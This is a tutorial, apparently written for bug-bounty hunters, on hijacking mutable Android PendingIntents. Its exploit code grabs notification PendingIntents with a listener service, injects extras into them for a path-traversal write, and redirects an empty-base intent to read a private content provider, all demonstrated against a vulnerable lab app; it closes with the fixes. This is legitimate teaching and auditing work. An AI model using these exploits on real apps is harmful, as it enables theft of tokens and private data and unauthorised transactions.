Lets suppose a scenario to understand the PendingIntent in Android. Your app posts a notification. Hours later your app long since killed by the OS, the user taps it, and your screen opens with your app's data loaded. The notification was drawn and tapped inside **System UI**, a completely different process running as a different user. How did a tap in someone else's process launch *your* activity, with *your* permissions, while your app wasn't even running?

It can't be done with a plain `Intent`. An `Intent` is inert data a description of an action. Whoever calls `startActivity(intent)` performs that action **as themselves**, with their own UID and permissions. If your app just handed System UI an `Intent`, System UI would fire it as System UI. That is not what you want, and for private components it would not even be allowed.

What you actually need is to **lend System UI your authority** for one specific action: "you may launch *this* activity, as *me*, when the user taps." That process is called a `PendingIntent`.

<br>**What a PendingIntent actually is**

When you call `PendingIntent.getActivity(context, requestCode, intent, flags)`, your app does not get a souped-up Intent back. It asks the system (`ActivityManagerService`) to **store a record**: the wrapped `Intent`, and crucially *who created it* - your package and UID. The system hands you back a lightweight token (a handle to that record). You give the token to someone else.

Later, the holder calls `token.send()`. The system looks up the record and fires the wrapped `Intent` **using the creator's identity, not the sender's**. So System UI taps the notification, calls `send()`, and the system launches your activity as your app - same UID, same permissions, same access to your private components and content providers.

That single sentence *it fires as the creator, not the holder*  is the entire reason PendingIntents exist, and the entire reason they are dangerous. You hand a token to another party, and when they use it, your identity is what acts.

You will find them behind every "do this later, on my behalf" feature:

- **Notifications** - `setContentIntent(pi)`: System UI launches your activity on tap.
- **AlarmManager** - `am.set(..., pi)`: the system fires your component at a scheduled time.
- **App widgets** - the launcher fires your `PendingIntent` when a widget button is pressed.
- **Inline reply / RemoteInput** - the system fires your `PendingIntent` after attaching the user's typed text.
- **Cross-app callbacks** - "here's a `PendingIntent`, fire it when you're done" handed to another app.

  </ul>

<br>**The two settings that decide whether it's safe**

When you create a PendingIntent you make two choices, and both turn into attack surface if you get them wrong.

**Choice 1 - can the holder modify the wrapped Intent before firing it?** Sometimes you *need* them to. Inline notification reply is the classic case: you build the PendingIntent, but the system has to add the text the user typed *before* it fires. That "let the holder add something" capability is `FLAG_MUTABLE`, and the holder modifies the Intent through a method called `Intent.fillIn()`. The safe default - "the holder may fire it exactly as I wrote it, nothing more" - is `FLAG_IMMUTABLE`.

Before Android 12 (API 31), PendingIntents were **mutable by default**, that means, you got mutability unless you asked for `FLAG_IMMUTABLE`. From API 31 you must say which one you mean. So old code, and unpatched third-party SDKs, are full of accidentally-mutable PendingIntents.

**Choice 2 - how specific is the wrapped Intent?** Think of the base Intent as a form with some fields filled and some left blank. You can nail down exactly what happens - set the explicit target component, set the data, set the extras - or you can leave it vague, even completely empty (`new Intent()`). The blanker the form, the more a mutable holder can write into it.

`fillIn()` is the method that writes into the blanks, and it has one governing rule: **it only writes into fields the base left empty.** That rule is the whole game.

<br>**Where it goes wrong**

Put the two choices together. If a PendingIntent is **mutable** *and* its base Intent **left fields blank**, then whoever holds it can fill those blanks in  and because `send()` fires as the creator, the creator's app carries out whatever the holder wrote. The holder did not need any permission of their own; they borrowed yours.

Here is exactly what `fillIn()` lets the holder change, because this table is the part the other write-ups skip and it is where all the confusion comes from:

| Field of the Intent | Can the holder set it? |
|---|---|
| `action`, `data`, `type`, `package`, `categories`, `clipData` | Yes - **only if the base left it empty** |
| `component`, `selector` | No - unless the holder passes `FILL_IN_COMPONENT` / `FILL_IN_SELECTOR` |
| extras | Always merged - but on a key conflict the **base wins** |
| `FLAG_GRANT_READ/WRITE_URI_PERMISSION` | Yes - rides along on the fillIn Intent |

Two outcomes fall straight out of that table, and they are the two severities of this bug:

- **The base set an explicit component** (e.g. `new Intent(this, SomeActivity.class)`). The component is locked, so the holder can only add *new extras*. Bounded: they make your app run the activity you chose, but with parameters they picked. Call it **Tier 1**.
- **The base was empty / implicit** (`new Intent()`). Now the holder fills in `action` + `package` to steer the launch into *their own* component, fills in `data` + a URI-grant flag, and walks off with whatever your app can reach. Call it **Tier 2**.

The rest of this post is how you find and prove both, against VulnLabApp.

<br>**Spotting it**

Grep the decompile for `FLAG_MUTABLE` and the factory calls:

```java
PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_MUTABLE);
```

For each one, ask the two questions: is it mutable, and is the base Intent explicit or empty? Then follow it forward - does it end up in a notification, a widget, an alarm, or an extra handed to another app?

Confirm both at runtime by hooking the factory:

```javascript
Java.perform(function () {
  const PI = Java.use('android.app.PendingIntent');
  PI.getActivity.overload('android.content.Context', 'int', 'android.content.Intent', 'int')
    .implementation = function (ctx, rc, intent, flags) {
      const mutable = (flags & 0x02000000) !== 0;
      const cn = intent.getComponent();
      console.log('[PI.getActivity] mutable=' + mutable + ' target=' + (cn ? cn.flattenToString() : 'implicit'));
      return this.getActivity(ctx, rc, intent, flags);
  };
});
```

`target=implicit` is the Tier-2 tell. One caveat on the `mutable` boolean: it only checks the explicit `FLAG_MUTABLE` bit. Pre-API-31, PendingIntents are mutable *by default*, so on Android ≤ 11 a PI built without the flag still prints `mutable=false` here yet is fully hijackable - `mutable=false` only clears the bug from API 31+.

Trigger the surfaces so the PendingIntents get built:

```bash
# Tier 1: fixed-base PI (or tap the "mutable PI" button)
adb shell am start -n com.vulnlab.app/.activities.NotificationActivity

# Tier 2: empty-base PI
adb shell am start -n com.vulnlab.app/.activities.NotificationActivity --ez post_empty_pi true

# AlarmManager-fired mutable PI (fires ~60s later)
adb shell am start-service -n com.vulnlab.app/.services.AlarmService
```

<br>**Tier 1 - fixed base intent, inject extras**

VulnLabApp's notification button wraps a *fixed* component:

```java
Intent targetIntent = new Intent(this, FileWriteActivity.class);   // component is locked
targetIntent.putExtra("_original_extra", "safe_value");
int piFlags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE;
PendingIntent pi = PendingIntent.getActivity(this, 1, targetIntent, piFlags);
// ... attached to a notification via setContentIntent(pi)
```

The holder can't redirect - the component is pinned to `FileWriteActivity` - but it can add extras the base never set. To grab the PendingIntent, register a `NotificationListenerService`: any app with notification access can read every posted notification and pull the `PendingIntent` straight out of it.

```java
public class NotificationHijacker extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!sbn.getPackageName().equals("com.vulnlab.app")) return;
        PendingIntent pi = sbn.getNotification().contentIntent;
        if (pi == null) return;
        try {
            // extras merge, base wins on conflicts — you inject NEW keys, not overwrite
            Intent fillIn = new Intent();
            fillIn.putExtra("filename", "../shared_prefs/auth_prefs.xml");
            fillIn.putExtra("content",  "<?xml version='1.0'?><map>"
                + "<boolean name=\"premium\" value=\"true\" /></map>");
            pi.send(this, 0, fillIn);
        } catch (CanceledException ignored) {}
    }
}
```

Register the listener and turn on notification access (it does nothing until access is granted - and this same listener is the acquisition path for Tier 2):

```xml
<service
    android:name=".NotificationHijacker"
    android:exported="false"
    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```

```bash
# Real device: user toggles Settings → Notification access. Test device:
adb shell cmd notification allow_listener \
  com.root3d.myapplication77/com.root3d.myapplication77.NotificationHijacker
```

<br>

Fire `NotificationActivity` to post the notification. Your listener catches it, adds `filename`/`content` (keys the base never set), and fires the PendingIntent into `FileWriteActivity` - which does the path-traversal write **as VulnLabApp**, overwriting its own `auth_prefs.xml` and flipping `premium=true`. Bounded, but it ran with the victim's identity, which is the whole point.

<br>**Tier 2 - empty base intent, redirect and steal a content provider**

This is the dangerous one, and every CVE here (CVE-2020-0188 `SettingsSliceProvider`, CVE-2020-0389 SystemUI `RecordingService`) is an instance of it. The app builds the PendingIntent from an **empty** base:

```java
// VulnLabApp: --ez post_empty_pi true posts a notification with this
PendingIntent leak = PendingIntent.getActivity(
    this, 2, new Intent(),   // empty base - every field unset
    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
```

Now the holder controls nearly everything. Per the table, they can't set `component` directly, so they steer the launch with `action` + `package` (which resolves into their own app), and they set `data` + `FLAG_GRANT_READ_URI_PERMISSION` so the victim grants them a URI. Point that URI at something the attacker can't reach but the victim can - VulnLabApp's private `SecretProvider`, declared `exported="false"`:

```java
// in the same NotificationListenerService
PendingIntent pi = sbn.getNotification().contentIntent;        // the empty-base PI
Intent fillIn = new Intent("com.attacker.GRANT");              // base action empty → fills
fillIn.setPackage("com.root3d.myapplication77");              // steer the launch to our app
fillIn.setData(Uri.parse("content://com.vulnlab.app.secret/token")); // base data empty → fills
fillIn.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);       // rides along
pi.send(this, 0, fillIn);
```

`send()` fires this as VulnLabApp, so VulnLabApp launches your activity *and grants it read access to that URI*:

```java
public class GrantReceiver extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            Uri u = getIntent().getData();                     // content://com.vulnlab.app.secret/token
            InputStream is = getContentResolver().openInputStream(u);
            // read is — the session token + api_key, from a provider you can't query directly
        } catch (Exception ignored) {}
        finish();
    }
}
```

```xml
<activity android:name=".GrantReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.attacker.GRANT" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

The rule that makes this "arbitrary" content provider access: **if VulnLabApp itself could not read `content://com.vulnlab.app.secret`, the grant flag would be silently ignored.** It can - it owns the provider so the access transfers to you, and `grantUriPermissions="true"` lets the grant bypass `exported="false"`. You just read a provider you could never have queried directly. Aim the same trick at whatever the *victim's* permissions cover its own private data, or a system provider like contacts/SMS if the app holds that permission — and the impact is whatever that app could read.

<br>**Other ways the PendingIntent leaks to you**

The notification listener is the most reachable acquisition today, but the same two tiers apply wherever a PendingIntent ends up in a hostile holder's hands:

- **App widgets.** The launcher (the widget host) holds the PendingIntent; a custom launcher / widget host fires it with mutated fields. Seen in home-screen banking widgets with "transfer to last recipient" buttons.
- **Cross-app extra.** Some apps pass a callback PendingIntent in an extra ("fire this when you're done"). If the receiver is your app, the leak is direct mutate and fire.

<br>**What you actually achieve**

- **Tier 1 — identity / action injection.** The launched activity reads `user_id` / `account_id` / `authorize` from the extras. Swap them: IDOR onto another user, or silently complete a queued transaction the user never confirmed. The nasty variant is stale-extra replay the base's original nonce survives (base wins on conflicts), so you keep the real user's nonce and add your own amount fields.
- **Tier 2 — arbitrary content provider read.** Steal data from a private or permission-protected provider using the victim app's identity. This is the critical-tier outcome, and the one worth chasing on any app with rich notifications.

<br>**Why it keeps happening, and the fix**

The fix is `FLAG_IMMUTABLE`, and never building a PendingIntent from an empty or implicit base. Developers skip both because third-party SDKs (analytics, push, ads) often *require* mutable PendingIntents so they can inject their own extras at fire time — so when you audit, grep the SDK `jar`/`aar` files too, not just app code. An SDK-shipped mutable PendingIntent is still the app's bug from a bounty perspective.

Android has been closing this down: API 31 forced an explicit `FLAG_MUTABLE`/`FLAG_IMMUTABLE` choice, and **API 34 blocks creating a mutable PendingIntent from an implicit base**, which kills Tier 2 at creation for compliant apps targeting 34+. Tier 1 (explicit-component base + mutable) is still allowed and still extras-injectable, and pre-34 apps and unpatched SDKs still ship the empty-base form.

<br>**Closing**

The whole bug is two facts standing next to each other: `send()` runs the wrapped Intent with the **creator's** identity, and `fillIn()` lets the holder of a **mutable** PendingIntent write into any field the base left **empty**. Decide if it's mutable, decide how empty the base is, and the severity reads itself off the table, Tier 1 makes the app act with your parameters, Tier 2 makes the app hand you data only it could reach. The notification-listener path reaches both. Worth checking on every banking or fintech app with rich push notifications.
